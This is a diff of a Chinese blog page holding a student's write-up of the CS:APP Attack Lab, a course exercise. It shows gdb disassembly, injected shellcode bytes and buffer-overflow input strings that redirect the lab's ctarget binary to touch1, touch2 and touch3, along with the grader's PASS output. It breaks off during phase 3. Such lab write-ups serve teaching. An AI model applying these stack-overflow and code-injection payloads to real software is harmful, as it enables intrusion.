@@ -1,91 +1,13 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next gemini use-motion" lang="zh_Hans">
+<html lang="zh">
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="utf-8">
+<title>Attack_lab - OneStep</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
 
 
 
-
-
-
-  
-  
-  <link rel="stylesheet" media="all" href="/lib/Han/dist/han.min.css?v=3.3">
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="CS:APP,汇编,代码注入攻击,">
-
-
-
-
-
-  <link rel="alternate" href="/atom.xml" title="OneStep" type="application/atom+xml">
-
-
-
-
-
-
-<meta name="description" content="实验描述">
+    <meta name="description" content="实验描述">
 <meta name="keywords" content="CS:APP,汇编,代码注入攻击">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Attack_lab">
@@ -93,47 +15,12 @@
 <meta property="og:site_name" content="OneStep">
 <meta property="og:description" content="实验描述">
 <meta property="og:locale" content="zh_Hans">
+<meta property="og:image" content="https://jason210314.github.io/images/og_image.png">
 <meta property="og:updated_time" content="2018-12-09T08:22:16.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Attack_lab">
 <meta name="twitter:description" content="实验描述">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="https://Jason210314.github.io/2018/12/08/Attack-lab/">
-
-
-
-
-
-  <title>Attack_lab | OneStep</title>
-  
+<meta name="twitter:image" content="https://jason210314.github.io/images/og_image.png">
 
 
 
@@ -141,718 +28,1270 @@
 
 
 
+<link rel="icon" href="/images/favicon.svg">
 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+    
+    
+
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
 </head>
-
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_Hans">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">OneStep</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+                <img src="/images/logo.svg" alt="Attack_lab" height="28">
             
-            Home
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
-            
-            About
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
-            
-            Categories
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://Jason210314.github.io/2018/12/08/Attack-lab/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Wmc">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/head.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneStep">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">Attack_lab</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-08T17:49:57+08:00">
-                2018-12-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/CS-APP/" itemprop="url" rel="index">
-                    <span itemprop="name">CS:APP</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+            </a>
         </div>
-      </header>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item" href="/">Home</a>
+                
+                <a class="navbar-item" href="/archives">Archives</a>
+                
+                <a class="navbar-item" href="/categories">Categories</a>
+                
+                <a class="navbar-item" href="/tags">Tags</a>
+                
+                <a class="navbar-item" href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                
+                <a class="navbar-item search" title="Search" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
     
-
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
     
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        <h3 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h3><a id="more"></a>
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-12-08T09:49:57.000Z">2018-12-08</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CS-APP/">CS:APP</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    11 minutes read (About 1582 words)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Attack_lab
+            
+        </h1>
+        <div class="content">
+            <h3 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h3><a id="more"></a>
 <p>本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在getbuf函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。</p>
 <h4 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h4><p>第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。</p>
 <p>那么我们将需要执行的操作码和地址输入机器码即可。</p>
 <h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p>第一关非常简单，题目主要我们在getbuf执行完成后执行touch1,touch1()无参。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas getbuf </span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x0000000000401688 &lt;+0&gt;:	sub    $0x18,%rsp</span><br><span class="line">   0x000000000040168c &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x000000000040168f &lt;+7&gt;:	callq  0x4018ca &lt;Gets&gt;</span><br><span class="line">   0x0000000000401694 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x0000000000401699 &lt;+17&gt;:	add    $0x18,%rsp</span><br><span class="line">   0x000000000040169d &lt;+21&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004016a0 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x00000000004016a4 &lt;+4&gt;:	movl   $0x1,0x2029ee(%rip)        # 0x60409c &lt;vlevel&gt;</span><br><span class="line">   0x00000000004016ae &lt;+14&gt;:	mov    $0x402e4e,%edi</span><br><span class="line">   0x00000000004016b3 &lt;+19&gt;:	callq  0x400bd0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004016b8 &lt;+24&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004016bd &lt;+29&gt;:	callq  0x401ab5 &lt;validate&gt;</span><br><span class="line">   0x00000000004016c2 &lt;+34&gt;:	mov    $0x0,%edi</span><br><span class="line">   0x00000000004016c7 &lt;+39&gt;:	callq  0x400d60 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas getbuf </span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x0000000000401688 &lt;+0&gt;:	sub    $0x18,%rsp</span><br><span class="line">   0x000000000040168c &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x000000000040168f &lt;+7&gt;:	callq  0x4018ca &lt;Gets&gt;</span><br><span class="line">   0x0000000000401694 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x0000000000401699 &lt;+17&gt;:	add    $0x18,%rsp</span><br><span class="line">   0x000000000040169d &lt;+21&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004016a0 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x00000000004016a4 &lt;+4&gt;:	movl   $0x1,0x2029ee(%rip)        # 0x60409c &lt;vlevel&gt;</span><br><span class="line">   0x00000000004016ae &lt;+14&gt;:	mov    $0x402e4e,%edi</span><br><span class="line">   0x00000000004016b3 &lt;+19&gt;:	callq  0x400bd0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004016b8 &lt;+24&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004016bd &lt;+29&gt;:	callq  0x401ab5 &lt;validate&gt;</span><br><span class="line">   0x00000000004016c2 &lt;+34&gt;:	mov    $0x0,%edi</span><br><span class="line">   0x00000000004016c7 &lt;+39&gt;:	callq  0x400d60 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
 <p>可以看到，getbuf开出了0x18，即24字节的空间，touch1的地址为0x4016a0。那么我们只需填满这0x28空间，再以touch1地址替代返回值。注意：x86-64机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a0 16 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a0 16 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 <p>转换后输入即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	2017211523</span><br><span class="line">	course	f18</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	2017211523</span><br><span class="line">	course	f18</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 <h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>第二关根据题意，需要调用touch2，需要传递一个无符号整数值，其值为cookie，查看cookie文件，如下。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ cat cookie.txt </span><br><span class="line">0x63149380</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ cat cookie.txt </span><br><span class="line">0x63149380</span><br></pre></td></tr></table></figure>
 <p>为了给touch2传参，我们需要将cookie值赋给%rdi，然后将touch2地址压栈，使用ret弹出touch2地址返回，调用touch2。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     $0x63149380,%rdi</span><br><span class="line">pushq   $0x4016cc</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     $0x63149380,%rdi</span><br><span class="line">pushq   $0x4016cc</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi</span><br><span class="line">   7:   68 cc 16 40 00          pushq  $0x4016cc</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi</span><br><span class="line">   7:   68 cc 16 40 00          pushq  $0x4016cc</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
 <p>我们将指令的机器码放在getbuf时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用getbuf时栈顶地址为0x5566f7a8。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 80 93 14 63 68</span><br><span class="line">cc 16 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a8 f7 66 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 80 93 14 63 68</span><br><span class="line">cc 16 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a8 f7 66 55 00 00 00 00</span><br></pre></td></tr></table></figure>
 <p>输入运行。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -q</span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch2!: You called touch2(0x63149380)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	2017211523</span><br><span class="line">	course	f18</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -q</span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch2!: You called touch2(0x63149380)</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	2017211523</span><br><span class="line">	course	f18</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00</span><br></pre></td></tr></table></figure>
 <h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>查看touch3</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">	validate(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">	fail(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch3</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">	vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">	validate(<span class="hljs-number">3</span>);</span><br><span class="line">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">	fail(<span class="hljs-number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>可知其需要一个指向字符的指针sval，然后调用hexmatch，将cookie和sval作为参数传入，需要hexomatch返回非零值。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hexmatch</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val, <span class="hljs-keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">char</span> cbuf[<span class="hljs-number">110</span>];</span><br><span class="line">    <span class="hljs-comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;</span><br><span class="line">    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">"%.8x"</span>, val);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>由hexmatch可知，其比较cookie的字符串表示与传入的字符串是否相等，相等则返回1，那么问题明了，我们需要将表示cookie的字符串地址传给touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用hexmatch时候未被重写改变的空间，借以保存字符串。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     $0x5566f7c8,%rdi</span><br><span class="line">pushq   $0x4017a0</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     $0x5566f7c8,%rdi</span><br><span class="line">pushq   $0x4017a0</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>这里我们将cookie的字符串表示放在0x5566f7c8，编译再反汇编得到机器码</p>
